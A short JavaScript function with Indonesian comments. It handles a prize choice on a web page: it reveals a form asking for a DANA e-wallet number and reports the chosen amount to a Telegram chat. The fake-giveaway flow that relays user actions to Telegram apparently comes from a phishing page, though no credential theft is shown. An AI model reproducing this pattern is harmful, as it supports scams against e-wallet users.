function pilihHadiah(nominal) {
    // Sembunyikan bagian pilih hadiah (gambar dan tombol)
    document.getElementById('pilihHadiah').style.display = 'none';

    // Tampilkan bagian masukkan nomor DANA
    document.getElementById('masukkanNomorDANA').style.display = 'block';

    // Simpan nominal di localStorage (opsional)
    localStorage.setItem('hadiah', nominal);

    // Kirim pesan ke Telegram
    sendMessageToTelegram(`Memilih hadiah: ${nominal}`);
}
